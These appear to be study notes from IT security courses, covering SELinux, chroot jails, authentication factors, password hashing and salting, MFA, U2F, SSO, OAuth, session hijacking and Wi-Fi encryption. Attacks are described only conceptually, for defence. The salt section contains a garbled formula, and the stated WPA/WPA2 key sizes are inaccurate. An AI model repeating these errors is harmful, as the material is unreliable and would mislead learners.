![Diagram Description automatically generated with low
confidence](media/image679.png){width="6.5in"
height="0.9076388888888889in"}

So if we were to say sudo systemctl restart httpd, ah, there\'s no
errors, which means if we come over here, and now we do
http://localhost:8888, oh, look at that.

We\'ve got the Testing 1, 2, 3 page on port 8888, even though SELinux,
by default, would not normally allow that. What we\'ve done is we\'ve
allowed it to also list it on port 8888 using SELinux. We didn\'t have
to disable it. We were able to leave it enabled, leave it enforcing, and
still allow us to use Apache on that port.

Now, I really want to be clear. SELinux\-- Security Enhanced Linux\--
this could be almost an entire course on its own\-- how to manage all
the contexts and labels and files and ports, and all the different
things that it manages. However, for privileges based on ports and
files, It\'s.

Not too bad to just make some modifications. And it\'s much better to
make those modifications and handle the changes, rather than just
disabling SELinux, which is what a lot of us old, crusty sysadmins did
for a lot of years. So SELinux is a powerful, powerful tool to help keep
your system safe, and some common issues\-- like not being able to
listen on a port\-- can be solved.

##### chroot jail (chroot command)

chroot command in Linux/Unix system is used to change the root
directory. Every process/command in Linux/Unix like systems has a
current working directory called root directory. It changes the root
directory for currently running processes as well as its child
processes.

A process/command that runs in such a modified environment cannot access
files outside the root directory. This modified environment is known as
"chroot jail" or "jailed directory". Some root user and privileged
process are allowed to use chroot command.

![Diagram Description automatically
generated](media/image680.jpeg){width="6.5in"
height="3.8944444444444444in"}

<https://www.geeksforgeeks.org/chroot-command-in-linux-with-examples/>

<https://www.youtube.com/watch?v=NBpgDvah8Xw>

**Chroot for SSH Connections:**
<https://www.tecmint.com/restrict-ssh-user-to-directory-using-chrooted-jail/>

**Commands --**

**1) Create a directory which will be parent directory**

mkdir /home/jail

**2) create binary and library directories**

mkdir /home/jail/bin /home/jail/lib64

**3) copy all commands to jail**

cp /bin/bash /bin/ls /home/jail/bin

**4) Print libraries**

ldd /bin/bash

**5) copy ldd files to /home/jail/lib64**

cp /lib64/libtinfo.so.5 /lib64/libdl.so.2 /lib64/libc.so.6
/lib64/ld-linux-x86-64.so.2 /home/jail/lib64

**6) now to jail directory**

chroot /home/jail

![Graphical user interface Description automatically
generated](media/image681.png){width="5.980001093613298in"
height="0.9897211286089239in"}

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--

How to Copy the shell and the libraries

![Text Description automatically
generated](media/image682.png){width="6.5in"
height="1.4020833333333333in"}

![Text Description automatically
generated](media/image683.png){width="6.5in"
height="0.9541666666666667in"}

#### IAM/AAA Security (User/Auth)

In this module, we\'ll cover the three A\'s of security, which are
**authentication, authorization, and accounting**. We\'ll cover exactly
what they are, how they relate to each other, and their common
implementations and protocols. Let\'s kick things off with
authentication, and by extension identification. You should be familiar
with authentication in the form of username and password problems when
accessing things like your email. So let\'s take that as an example to
show the differences between identification and authentication.
Identification is the idea of describing an entity uniquely. For
example, your email address is your identity when logging into your
email. But how do you go about proving you are who you claim to be?
That\'s the process we call authentication.

**Authentication**

When a person's identity is established with proof and confirmed by a

system

> ● Something you know
>
> ● Something you are
>
> ● Something you have
>
> ● Something you do
>
> ● Somewhere you are

When accessing your email, you\'re claiming to be your email address,
and you\'d supply a password associated with the identity to prove it\'s
you, or at least you know the password associated with the e-mail
account. Pretty straightforward, right?

This is distinctly different from **authorization**, which pertains to
the resources and identity has access to. These two concepts are usually
distinguished from each other in the security world, with the terms
authn for authentication and authz for authorization. In our e-mail
account login example, by authenticating using your email address and
password, your identity is authorized to access your email inbox, but
you\'re not authorized to access anyone else\'s inbox. We really don\'t
want anyone else getting access to our inbox, right? So what can we do
to ensure that only we are able to identify and authenticate as our
e-mail account? We could start by ensuring that we\'re using a strong
password. But what exactly constitutes a strong password? Well, what do
you think of the password ponies? Would you categorize that as a strong
password? I hope not. That password is super short, and only six
characters, and all of those characters are lowercase letters. This is a
short and simple password, but that could be easily broken through brute
force or dictionary based attacks. Ponies would almost definitely be in
a dictionary file, and six characters doesn\'t provide a large pool of
possibilities for an attacker to try. We can ensure a password is strong
by making it longer and more complex, adding numbers, uppercase letters,
and special characters like punctuation. What do you think of the
strength of this password? That seems way more secure, doesn\'t it? It
adds complexity, which increases the pool of possible passwords, and is
longer at 10 characters. But which of these two passwords do you think
you would be able to remember tomorrow? Probably not the strong one,
right? This highlights a super important concept in security. There\'s
often a trade-off between security and usability. With our password
example, the more usable password that\'s easy to memorize is less
secure, while the more secure password is much more challenging to
remember. This concept applies to many other security subjects, not just
passwords. You can think of security as risk mitigation, and when it
comes to risk mitigation, it\'s impossible to completely eliminate the
risk. The best you can do is understand the risks your systems face,
take measures to reduce those risks, and monitor them. Think about it
like this, the most secure computer system is one that\'s disconnected
from everything, including networking, and even power and is locked in a
concrete bunker hundreds of feet underground that no one has access to.
While this is incredibly secure machine, almost impossible to
compromise, it\'s basically useless since it\'s powered off and no one
can access it. This is an extreme example of the security versus
usability trade-off, but you get the point. Coming back to our password
example, we obviously need to find some sort of happy medium, but where
we have a reasonably secure password that\'s also somewhat easy to
memorize. How about something like this. We start with a short phrase,
Ilikeponies, then replace some letters with numbers that resemble the
letters to help with memorization. We also swapped the S with the Z
since they\'re similar sounding and tacked on some numbers as a suffix.
At first glance, this seems like a very complex password and will be
hard to memorize, but it\'s easier than a random password example.
Problem solved, right? Well, you should actually be wary of this number
substitution process, since it\'s well-known by attackers and password
cracking tools. As an I.T. support specialist, ensuring that your
organization uses strong passwords and practices, good password hygiene
are super important. They\'re literally the keys to the kingdom. So what
should we do? Incorporating good password policies into an organization
is key to ensuring that employees are securing their accounts with
strong passwords. A good password policy system would enforce length
requirements, character complexity, and check for the presence of
dictionary words, which would undermine the strength of passwords.
Passwords should never be written down or recorded in plain text, reused
across accounts or be shared with anyone. Password reuse is a risk
because in the event the password for one account is compromised, other
accounts using the same password would also be at risk. Sharing
passwords should also be a no go, since this undermines the identity of
an account because someone else now has the ability to log in as that
user. Along with requiring the use of strong passwords, a password
rotation policy is also recommended, since it safeguards against
potential undetected compromised passwords. But it\'s important that a
password rotation period isn\'t too short. Why? The inconvenience of
having to change passwords so often may actually encourage poor security
behavior by users. So let\'s say you required your organization to
create highly complex passwords and to change them every three months.
It\'s very likely that a significant percentage of users would write
down their passwords on post-it notes or on their phones. A big no no.
Despite the policy being designed to increase security, it actually has
the opposite effect because of the inconvenience it causes your users.

##### Authentication

###### Authenticating users

####### **User provisioning**

Back-end systems need to be able to verify whether the information
provided by a user is accurate. To accomplish this, users must be
properly provisioned. **User provisioning** is the process of creating
and maintaining a user\'s digital identity. For example, a college might
create a new user account when a new instructor is hired. The new
account will be configured to provide access to instructor-only
resources while they are teaching. Security analysts are routinely
involved with provisioning users and their access privileges.

**Pro tip:** Another role analysts have in IAM is to deprovision users.
This is an important practice that removes a user\'s access rights when
they should no longer have them.

####### **Granting authorization**

If the right user has been authenticated, the network should ensure the
right resources are made available. There are three common frameworks
that organizations use to handle this step of IAM:

-   Mandatory access control (MAC)

-   Discretionary access control (DAC)

-   Role-based access control (RBAC)

![A diagram of a computer system Description automatically generated
with low confidence](media/image684.png){width="6.5in"
height="3.6569444444444446in"}

####### **Mandatory Access Control (MAC)**

MAC is the strictest of the three frameworks. Authorization in this
model is based on a strict need-to-know basis. Access to information
must be granted manually by a central authority or system administrator.
For example, MAC is commonly applied in law enforcement, military, and
other government agencies where users must request access through a
chain of command. MAC is also known as non-discretionary control because
access isn't given at the discretion of the data owner.

![A data owner choosing to grant specific users access to their
data.](media/image685.png){width="6.5in" height="3.6569444444444446in"}

####### **Discretionary Access Control (DAC)**

DAC is typically applied when a data owner decides appropriate levels of
access. One example of DAC is when the owner of a Google Drive folder
shares editor, viewer, or commentor access with someone else.

![A system administrator assigning users to specific roles that have
predefined access levels.](media/image686.png){width="6.5in"
height="3.6569444444444446in"}

####### **Role-Based Access Control (RBAC)**

RBAC is used when authorization is determined by a user\'s role within
an organization. For example, a user in the marketing department may
have access to user analytics but not network administration.

###### Password Hardening

We\'ve already alluded to attacks on hashes. Now let\'s learn more
details, including how to defend against these attacks. One crucial
application for cryptographic hash functions is for authentication.
Think about when you log into your e-mail account. You enter your e-mail
address and password. What do you think happens in the background for
the e-mail system to authenticate you? It has to verify that the
password you entered is the correct one for your account. You could just
take the user supplied password and look up the password on file for the
given account and compare them. Right? If they\'re the same, then the
user is authenticated. Seems like a simple solution but does that seem
secure to you? In the authentication scenario, we\'d have to store user
passwords in plain text somewhere. That\'s a terrible idea. You should
never ever store sensitive information like passwords in plain text.
Instead, you should do what pretty much every authentication system
does, store a hash of the password instead of the password itself. When
you log into your e-mail account the password you entered is run through
the hashing function and then the resulting hash digest is compared
against the hash on file. If the hashes match, then we know the password
is correct, and you\'re authenticated. Password shouldn\'t be stored in
plain text because if your systems are compromised, passwords for other
accounts are ultimate prize for the attacker. If an attacker manages to
gain access to your system and can just copy the database of accounts
and passwords, this would obviously be a bad situation. By only storing
password hashes, the worst the attacker would be able to recover would
be password hashes, which aren\'t really useful on their own. What if
the attacker wanted to figure out what passwords correspond to the
hashes they stole? They would perform a brute force attack against the
password hash database. This is where the attacker just tries all
possible input values until the resulting hash matches the one they\'re
trying to recover the plain text for. Once there\'s a match, we know
that the input that\'s generated that matches the hash is the
corresponding password. As you can imagine, a brute force attack can be
very computationally intensive depending on the hashing function used.
An important characteristic to call out about brute force attacks is,
technically, they\'re impossible to protect against completely. A
successful brute force attack against even the most secure system
imaginable is a function of attacker time and resources. If an attacker
has unlimited time and or resources any system can be brute force.
Yikes. The best we can do to protect against these attacks, is to raise
the bar. Make it sufficiently time and resource intensive so that it\'s
not practically feasible in a useful timeframe or with existing
technology. Another common method to help raise the computational bar
and protect against brute force attacks is to run the password through
the hashing function multiple times, sometimes through thousands of
interactions. This would require significantly more computations for
each password guess attempt.

####### Key Stretching

In an effort to increase the security of their passwords, Dion Training
has added a salt and cryptographic hash to their passwords prior to
storing them. To further increase security, they run this process many
times before storing the passwords. This technique is an example of
**key stretching**.

In cryptography, key stretching techniques are used to make a possibly
weak key, typically a password or passphrase, more secure against a
brute-force attack by increasing the resources it takes to test each
possible key. 

####### Password Salt

![Diagram Description automatically
generated](media/image687.png){width="6.5in"
height="3.9493055555555556in"}

So...

-   password + salt = hash(password + salt)

-   Therefore, password = password -- salt

So if salt + hash = "secret password", then to compare passwords you
just...

-   Extract salt from the secret password

-   Hash(password +salt)

-   Compare this new value against "secret password"

Early Unix systems used a 12 Bit salt, which amounts to a total of 4,096
possible salts. So, an attacker would have to generate hashes for every
password in their database, 4,096 times over. Modern systems like Linux,
BSD and Solaris use a 128 bit salt. That means there are two to the 128
power possible salt values, which is over 340 undecillion. That\'s 340
with 36 zeros following. Clearly, 128 bit salt raises the bar high
enough that a rainbow table attack wouldn\'t be possible in any
realistic time-frame. Just another scenario when adding salt to
something makes it even better. That runs out our lesson on hashing
functions. Up next we\'ll talk about real world applications of
cryptography and explain how it\'s used in various applications and
protocols. But first, a project that will help you get hands on with
hashing. Hashtag, get it done.

###### Multifactor Authentication

In the last video, we learned about basic authentication in the form of
username, password, sometimes referred to as single-factor
authentication. But there are other more complex and secure
authentication mechanisms. Keep in mind the security versus usability
tradeoff, as we work through the different types of multifactor
authentication. Multifactor authentication is a system where users are
authenticated by presenting multiple pieces of information or objects.
The many factors that comprise a multifactor authentication system can
be categorized into three types. Something you know, something you have,
and something you are. Ideally, a multifactor system will incorporate at
least two of these factors. Something you know would be something like a
password, or a pin for your bank or ATM card. Something you have would
be a physical token, like your ATM or bank card. Something you are would
be a piece of biometric data, like a fingerprint or iris scan. The
premise behind multifactor authentication is that an attacker would find
it much more difficult to steal or clone multiple factors of
authentication, assuming different types are used. If multiple passwords
are used, security isn\'t enhanced by that much. This is because
passwords, however many, are still susceptible to phishing or keylogging
attacks. By using a password in conjunction with a security token is a
game changer. Even if the password is compromised by a phishing attack,
the attacker would also need to steal or clone the physical token to be
able to access the account. And that\'s much less likely to happen. We
won\'t cover passwords again here since we talked about them in detail
in the last section. But here\'s the quick rundown. Physical tokens can
take a few different forms. Common ones include a USB device with a
secret token on it, a standalone device which generates a token, or even
a simple key used with a traditional lock. A physical token that\'s
commonly used generates a short-lived token. Typically a number that\'s
entered along with a username and password. This number is commonly
called a One-Time-Password or OTP since it\'s short-lived and constantly
changing value. An example of this is the RSA SecurID token. It\'s a
small, battery-powered device with an LCD display, that shows a
One-Time-Password that\'s rotated periodically. This is a time-based
token sometimes called a TOTP, and operates by having a secret seed or
randomly generated value on the token that\'s registered with the
authentication server. The seed value is used in conjunction with the
current time to generate a One-Time-Password. Now, as long as the user
has possession of their token, or can view the display of the token,
they are able to log in. I should also call out that the scheme requires
the time between the authenticator token, and the authentication server
to be relatively synchronized. This is usually achieved by using the
Network Time Protocol or NTP. An attacker would need to either steal the
physical token or clone the token if they\'re able to steal the secret
seed value. Since a time-based token is synchronized with the server
using time, which is not a secret, that would be sufficient for an
attacker to clone a token. There are also counter-based tokens, which
use a secret seed value along with the secret counter value that\'s
incremented every time a one-time password is generated on the device.
The value is then incremented on the server upon successful
authentication. This is more secure than the time-based tokens for two
reasons. First, the attacker would need to recover the seed value and
the counter value. Second, the counter value is also incrementing when
it\'s being used. So, a cloned token would only be useful for a short
period of time before the counter value changes too much and the clone
token becomes un-synchronized from the real token and the server. These
token generators can either be physical, dedicated devices, or they can
be an app installed on a smartphone that performs the same
functionality. Another very common method for handling multifactor
today, is that the delivery of one-time password tokens using SMS. But
this has been subject to some criticism, because of the observed attacks
through this channel. The problem with relying on SMS to transmit an
additional authentication factor is that you\'re dependent on the
security processes of the mobile carrier. SMS isn\'t encrypted, nor is
it private. And it\'s possible for SMS to be intercepted by a
well-funded attacker. Even worse, there have been accounts of SMS based
multifactor codes being stolen by calling the mobile provider. The
attacker impersonates the owner of the line of service to redirect phone
calls and SMS to a phone the attacker controls. If the attacker has
already compromised the password and can get SMS redirected to them,
they now get full access to the account. Of course, there\'s a
convenience tradeoff when you use a physical token. You have to carry
around another device in order to authenticate. If the device is lost or
damaged, the user won\'t be able to authenticate until the device is
replaced. This also requires support overhead, since devices will fail,
be lost, run off batteries, and get out of sync with the server. Using
an app on a smartphone addresses some of these issues, but still,
require some additional support and inconvenience. When prompted to log
in, the user must retrieve a device or phone from their pocket and
manually transcribe the numbers into the authentication page. These
generated one-time passwords are also susceptible to man in the middle
style phishing attacks. A user can be tricked into going to a fake
authentication page by sending a phishing email. Something on the lines
of, \"your account has been compromised, please log in and change your
password immediately.\" When the victim enters their credentials in the
fake page, including the one-time password, the attacker has all the
information needed to take over the account. The other category of
multifactor authentication is biometrics, which has gained in popularity
in recent years, especially in mobile devices. Biometric authentication
is the process of using unique physiological characteristics of an
individual to identify them. By confirming the biometric signature, the
individual is authenticated. A very common use of this in mobile devices
is fingerprint scanners to unlock phones. This works by registering your
fingerprints first, using an optical sensor that captures images of the
unique pattern of your fingerprint. Much like how passwords should never
be stored in plain text, biometric data used for authentication, so, it
also never be stored directly. This is even more important for handling
biometric data. Unlike passwords, biometrics are an inherent part of who
someone is. So, there are privacy implications to theft or leaks of
biometric data. Biometric characteristics can also be super difficult to
change in the event that they are compromised unlike passwords. So,
instead of storing the fingerprint data directly, the data is run
through a hashing algorithm and the resulting unique hash is stored. One
advantage of biometric authentication over knowledge or token-based
systems, is that it\'s more reliable to identify an individual for
authentication, since biometric features aren\'t usually shareable. For
example, you can\'t give your friend your fingerprints so that they can
log in as you. Well, you\'d hope not anyway. But as schools start to
introduce fingerprint based attendance recording systems, students are
finding ways to trick the system. They\'re creating fake fingerprints
using things like glue, allowing friends to marking each other as
present if they\'re late or if they skip school. This is harder to
achieve than sharing a password, but it\'s sort of ingenious of these
kids to think up. They really go the extra mile to skip school these
days. Not that I\'m condoning this behavior, but you can read more about
it just after this video. Other biometric systems use features like iris
scans, facial recognition, gate detection and even voice. Microsoft
developed the biometric authentication system for Windows 10, called
Windows Hello, which supports fingerprint identification, iris
identification and facial recognition. It uses two cameras, one for
color and one for infrared, which allows for depth detection. This way,
it\'s not possible to trick the system using a printout of an authorized
user\'s face.

####### Universal Second Factor

An evolution of physical tokens is the U2F or Universal Second Factor.
It\'s a standard developed jointly by Google, Yubico and NXP
Semiconductors. The finalized standard for U2F are being hosted by the
FIDO alliance. U2F incorporates a challenge-response mechanism, along
with public key cryptography to implement a more secure and more
convenient second-factor authentication solution. U2F tokens are
referred to as security keys and are available from a range of
manufacturers. Support for U2F authentication is built into the Chrome
browser and the Opera browser, with native Firefox support coming soon.
Security keys are essentially small embedded cryptoprocessors, that have
secure storage of asymmetric keys and additional slots to run embedded
code. Let\'s do a quick rundown on how exactly security keys work, and
how their improvement over an OTP solution. The first step is
registration, since the security key must be registered with a site or
service. At registration time, the security key generates a
private-public key pair unique to that site, and submits the public key
to the site for registration. It also binds the identity of the site
with the key pair. The reason for unique key pairs for each site is for
privacy reasons. If a site is compromised, this prevents
cross-referencing registered public keys, and discovering commonalities
between sites based on registration data. Once registered with the site,
the next time you\'re prompted to authenticate, you\'ll be prompted for
your username and password as usual. But afterwards, you\'ll be prompted
to tap your security key. When you physically tap the security key,
it\'s a small check for user presence to ensure malware cant
authenticate on your behalf, without your knowledge. This tap will
unlock the private keys stored in the security key, which is used to
authenticate. The authentication happens as a challenge-response
process, which protects against replay attacks. This is because the
authentication session can\'t be used again later by an eavesdropper,
because the challenge and resulting response will be different with
every authentication session. What happens is the site generates a
challenge, essentially, some randomized data and sends this to the
client that\'s attempting to authenticate. The client will then select
the private key matching the site, and use this key to sign the
challenge and send the signed data back. The site can now verify the
signature using the public key that was registered earlier. If the
signature checks out, the user is authenticated. From a security
perspective, this is a much more secure design than OTPs. This is
because, the authentication flow is protected from phishing attacks,
given the interactive nature of the process. While U2F doesn\'t directly
protect against man in the middle attacks, the authentication should
take place over a secure TLS connection, which would provide protection
from this type of attack. Security keys are also resistant to cloning or
forgery, because they have unique, embedded secrets on them and are
protected from tampering. From the convenience perspective, this is a
much nicer authentication flow compared to OTPs since the user doesn\'t
have to manually transcribe a string of numbers into the authentication
dialog. All they have to do is tap their security key. Nice and easy. As
an IT support specialist, you may come across multifactor authentication
setups, that you\'ll be responsible for supporting. You might even be
tasked with helping to implement one. So, it\'s important to understand
how they provide enhanced account protection, along with the options
that are available.

**The System Security Services Daemon** (sssd) connects the local system
to remote authentication services. 

####### Strengthening authentication

MFA builds on the benefits of SSO. It works by having users prove that
they are who they claim to be. The user must provide two factors (2FA)
or three factors (3FA) to authenticate their identification. The MFA
process asks users to provide these proofs, such as:

To ensure the right user is attempting to access a resource requires
some form of proof that the user is who they claim to be. In a [video on
authentication
controls](https://www.coursera.org/learn/assets-threats-and-vulnerabilities/item/r6XuB),
you learned that there are a few factors that can be used to
authenticate a user:

-   **Knowledge**, or something the user knows

    -   most commonly a username and password

-   **Ownership**, or something the user has (possesses)

    -   normally received from a service provider, like a one-time
        passcode (OTP) sent via SMS

-   **Characteristic**, or something the user is.

    -   refers to physical characteristics of a user, like their
        fingerprints or facial scans

Authentication is mainly verified with login credentials. **Single
sign-on** (SSO), a technology that combines several different logins
into one, and **multi-factor authentication** (MFA), a security measure
that requires a user to verify their identity in two or more ways to
access a system or network, are other tools that organizations use to
authenticate individuals and systems.

**Pro tip:** Another way to remember this authentication model is:
something you know, something you have, and something you are.

Requiring multiple forms of identification is an effective security
measure, especially in cloud environments. It can be difficult for
businesses in the cloud to ensure that the users remotely accessing
their systems are not threat actors. MFA can reduce the risk of
authenticating the wrong users by requiring forms of identification that
are difficult to imitate or brute force.

###### SSO: A better approach to authentication

**Single sign-on** (SSO) is a technology that combines several different
logins into one. More companies are turning to SSO as a solution to
their authentication needs for three reasons:

1.  **SSO improves the user experience** by eliminating the number of
    usernames and passwords people have to remember.

2.  **Companies can lower costs** by streamlining how they manage
    connected services.

3.  **SSO improves overall security** by reducing the number of access
    points attackers can target.

This technology became available in the mid-1990s as a way to combat
*password fatigue*, which refers to people's tendency to reuse passwords
across services. Remembering many different passwords can be a
challenge, but using the same password repeatedly is a major security
risk. SSO solves this dilemma by shifting the burden of authentication
away from the user.

####### How SSO works

SSO works by automating how trust is established between a user and a
service provider. Rather than placing the responsibility on an employee
or customer, SSO solutions use trusted third-parties to prove that a
user is who they claim to be. This is done through the exchange of
encrypted access tokens between the identity provider and the service
provider.

Similar to other kinds of digital information, these access tokens are
exchanged using specific protocols. SSO implementations commonly rely on
two different authentication protocols: LDAP and SAML. LDAP, which
stands for Lightweight Directory Access Protocol, is mostly used to
transmit information on-premises; SAML, which stands for Security
Assertion Markup Language, is mostly used to transmit information
off-premises, like in the cloud.

**Note:** LDAP and SAML protocols are often used together.

Here\'s an example of how SSO can connect a user to multiple
applications with one access token:

![One user connects to multiple applications with one access
token.](media/image688.png){width="6.5in" height="3.395138888888889in"}

####### Limitations of SSO

Usernames and passwords alone are not always the most secure way of
protecting sensitive information. SSO provides useful benefits, but
there's still the risk associated with using one form of authentication.
For example, a lost or stolen password could expose information across
multiple services. Thankfully, there's a solution to this problem.

######## MFA to the rescue

**Multi-factor authentication** (MFA) requires a user to verify their
identity in two or more ways to access a system or network. In a sense,
MFA is similar to using an ATM to withdraw money from your bank account.
First, you insert a debit card into the machine as one form of
identification. Then, you enter your PIN number as a second form of
identification. Combined, both steps, or factors, are used to verify
your identity before authorizing you to access the account.

![An equation showing user login plus biometric or physical devices
equal access.](media/image689.png){width="6.5in"
height="2.0284722222222222in"}

###### OAuth

OAuth is an open standard that allows users to grant third-party
websites and applications access to their information without sharing
account credentials. This can be thought of as a form of access
delegation because access to the user\'s account is being delegated to
the third party. This is accomplished by prompting the user to confirm
that they agree to permit the third party access to certain information
about their account. Typically, this prop will specifically list which
pieces of information or access are being requested. Once confirmed, the
identity provider will supply the third party with a token that gives
them access to the user\'s information. This token can then be used by
the third party to access data or services offered by the identity
provider directly on behalf of the user. OAuth is commonly used to grant
access to third party applications, to APIs offered by large internet
companies like Google, Microsoft, and Facebook. Let\'s say you want to
use a third party meme creation website. This website lets you create
memes using templates and gives you the option to save your creations
and email them to your friends. Instead of the site sending the emails
directly, which would appear to be coming from an address your friends
wouldn\'t recognize, the site uses OAuth to get permission to send the
memes using your email account directly. This is done by making an OAuth
request to your email provider. Once you approve this request, the email
provider issues an access token to the site, which grants the site
access to your email account. The access token would have a scope, which
says that it can only be used to access email, not other services
associated with the account. So it can access email but not your cloud
storage files or calendar, for example. It\'s important that users pay
attention to what third party is requesting access and what exactly
they\'re granting access to. OAuth permissions can be used in phishing
style attacks to gain access to accounts without requiring credentials
to be compromised. This works by sending phishing emails to potential
victims that look like legitimate OAuth authorization requests, which
ask the user to grant access to some aspects of their account through
OAuth. Once the user grants access, the attacker has access to the
account through the OAuth authorization token. This was used in an OAuth
based worm attack in early 2017. There was a rash of phishing emails
that appeared to be from a friend or colleague who wanted to share a
google doc. When the sharing link was followed, the victim was prompted
to log in and authorize access to email documents and contacts for some
third party service, which only identified itself as the name Google
Apps. But it was actually a malicious service that would then email
contacts from their email account perpetuating the attack. In case you
like to read more about it, I\'ve included a link in the next reading.
It\'s important to distinguish between OAuth and OpenID. OAuth is
specifically an authorization system and OpenID is an authentication
system. Though they\'re usually used together, OpenID Connect is an
authentication layer built on top of OAuth 2.0 designed to improve upon
OpenID and build better integration with OAuth authorizations. Since
TACACS plus is a full AAA system, it also handles authorization along
with authentication. This is done once a user is authenticated by
allowing or disallowing access for the user account to run certain
commands or access certain devices. This lets you not only allow admin
access for users that administer devices while still allowing less
privileged access to other users when necessary. Here\'s an example,
since your networking teams are responsible for configuring and
maintaining your network switches, routers, and other infrastructure.
You\'d give them admin access to your network and equipment. Meanwhile,
you can have limited read-only access to your support team since they
don\'t need to be able to make changes to switch configurations in their
jobs. Read-only access is enough for them to troubleshoot problems. The
rest of the user accounts would have no access at all and wouldn\'t be
permitted to connect to the networking infrastructure. So more
sophisticated or configurable AAA systems may even allow further
refinement of authorization down to the command level. This gives you
much more flexibility in how your access is granted to specific users or
groups in your organization. RADIUS also allows you to authorize network
access. For example, you may want to permit some users to have Wi-Fi and
VPN access while others may not need this. When they authenticate to the
RADIUS server, if the authentication succeeds, the RADIUS server returns
configuration information to the network access server. This includes
authorizations which specifies what network services the user is
permitted to access.

##### Authorization

After a user/service has been authenticated, we need to make sure that
have proper access to the resource they are trying to reach.

##### Accounting

-   Audit access logs

-   Tracking of data, computer usage, and network resources

-   Non-repudiation occurs when you have proof that someone has taken an
    action

Accounting is the practice of monitoring the access logs of a system.
These logs contain information like who accessed the system, and when
they accessed it, and what resources they used.

Security analysts use access logs a lot. The data they contain is a
helpful way to identify trends, like failed login attempts. They\'re
also used to uncover hackers who have gained access to a system, and for
detecting an incident, like a data breach.

In this field, access logs are essential. Oftentimes, analyzing them is
the first procedure you\'ll follow when investigating a security event.
So, how do access logs compile all this useful information? Let\'s
examine this more closely.

Anytime a user accesses a system, they initiate what\'s called a
session. A session is a sequence of network HTTP basic auth requests and
responses associated with the same user, like when you visit a website.
Access logs are essentially records of sessions that capture the moment
a user enters a system until the moment they leave it.

Two actions are triggered when the session begins. The first is the
creation of a session ID. A session ID is a unique token that identifies
a user and their device while accessing the system. Session IDs are
attached to the user until they either close their browser or the
session times out.

The second action that takes place at the start of a session is an
exchange of session cookies between a server and a user\'s device. A
session cookie is a token that websites use to validate a session and
determine how long that session should last. When cookies are exchanged
between your computer and a server, your session ID is read to determine
what information the website should show you.

Cookies make web sessions safer and more efficient. The exchange of
tokens means that no sensitive information, like usernames and
passwords, are shared. Session cookies prevent attackers from obtaining
sensitive data. However, there\'s other damage that they can do. With a
stolen cookie, an attacker can impersonate a user using their session
token. This kind of attack is known as session hijacking.

Session hijacking is an event when attackers obtain a legitimate user\'s
session ID. During these kinds of attacks, cyber criminals impersonate
the user, causing all sorts of harm. Money or private data can be
stolen. If, for example, hijackers obtain a single sign-on credential
from stolen cookies, they can even gain access to additional systems
that otherwise seem secure.

This is one reason why accounting and monitoring session logs is so
important. Unusual activity on access logs can be an indication that
information has been improperly accessed or stolen. At the end of the
day, accounting is how we gain valuable insight that makes information
safer.

##### IAM: Identity and access management

As organizations become more reliant on technology, regulatory agencies
have put more pressure on them to demonstrate that they're doing
everything they can to prevent threats. **Identity and access
management** (IAM) is a collection of processes and technologies that
helps organizations manage digital identities in their environment. Both
AAA and IAM systems are designed to authenticate users, determine their
access privileges, and track their activities within a system.

Either model used by your organization is more than a single, clearly
defined system. They each consist of a collection of security controls
that ensure the *right user* is granted access to the *right resources*
at the *right time* and for the *right reasons*. Each of those four
factors is determined by your organization\'s policies and processes.

**Note:** A user can either be a person, a device, or software.

##### Quiz questions

![Table Description automatically generated with medium
confidence](media/image690.png){width="6.5in"
height="7.102777777777778in"}

![Table Description automatically generated with medium
confidence](media/image691.png){width="6.5in"
height="7.680555555555555in"}

![Graphical user interface, text Description automatically
generated](media/image692.png){width="6.5in"
height="7.810416666666667in"}

![Graphical user interface, text Description automatically
generated](media/image693.png){width="6.5in" height="7.8in"}

![Graphical user interface, text, application Description automatically
generated](media/image694.png){width="6.229166666666667in"
height="7.53125in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image695.png){width="6.302083333333333in"
height="4.4375in"}

#### Wireless Security (WEP,WPA,WPA2)

##### **WEP**

**WEP** stands for Wired Equivalent Privacy, and it\'s an encryption
technology that provides a very low level of privacy. Actually, it\'s
really right there in the name, wired equivalent privacy. Using WEP
protects your data a little but it should really only be seen as being
as safe as sending unencrypted data over a wired connection. The WEP
standard is a really weak encryption algorithm.

***It\'s important to know that the number of bits in an encryption key
corresponds to how secure it is, the more bits in a key the longer it
takes for someone to crack the encryption.***

WEP only uses 40 bits for its encryption keys and with the speed of
modern computers, this can usually be cracked in just a few minutes. WEP
was quickly replaced in most places with WPA or Wi-Fi Protected Access.

**WPA**, by default, uses a 128-bit key, making it a whole lot more
difficult to crack than WEP. Today, the most commonly used encryption
algorithm for wireless networks is WPA2, an update to the original WPA.

**WPA2** uses a 256-bit key make it even harder to crack. Another common
way to help secure wireless networks is through MAC filtering.

With **MAC filtering**, you configure your access points to only allow
for connections from a specific set of MAC addresses belonging to
devices you trust. This doesn\'t do anything more to help encrypt
wireless traffic being sent through the air, but it does provide an
additional barrier preventing unauthorized devices from connecting to
the wireless network itself.

![Text Description automatically
generated](media/image696.png){width="6.5in"
height="4.879166666666666in"}

##### WPA/WPA2

![Text Description automatically
generated](media/image697.png){width="6.5in" height="5.2875in"}

![Graphical user interface, text Description automatically
generated](media/image698.png){width="6.5in"
height="5.252777777777778in"}

It\'s okay if you\'re not sure, just keep this question in mind as we go
over all the options available along with their benefits and drawbacks.
Spoiler alert, there\'s some pretty technical security stuff coming your
way, so put your thinking caps on. The first security protocol
introduced for Wi-Fi networks was WEP or Wired Equivalent Privacy. It
was part of the original 802.11 standard introduced back in 1997. WEP
was intended to provide privacy on par with the wired network, that
means the information passed over the network should be protected from
third parties eavesdropping. This was an important consideration when
designing the wireless specification.

Play video starting at :1:42 and follow transcript1:42

Unlike wired networks, packets could be intercepted by anyone with
physical proximity to the access point or client station. Without some
form of encryption to protect the packets, wireless traffic would be
readable by anyone nearby who wants to listen. WEP was proven to be
seriously bad at providing confidentiality or security for wireless
networks. It was quickly discounted in 2004 in favor of more secure
systems. Even so, we\'ll cover it here for historical purposes. I want
to drive home the point that no one should be using WEP anymore. You
never know, you may see seriously outdated systems when working as an IT
support specialist. So it\'s important that you fully understand why WEP
is outdated and what you can do instead.

Play video starting at :2:28 and follow transcript2:28

WEP use the RC4 symmetric stream cipher for encryption. It used either a
40-bit or 104-bit shared key where the encryption key for individual
packets was derived. The actual encryption key for each packet was
computed by taking the user-supplied shared key and then joining a
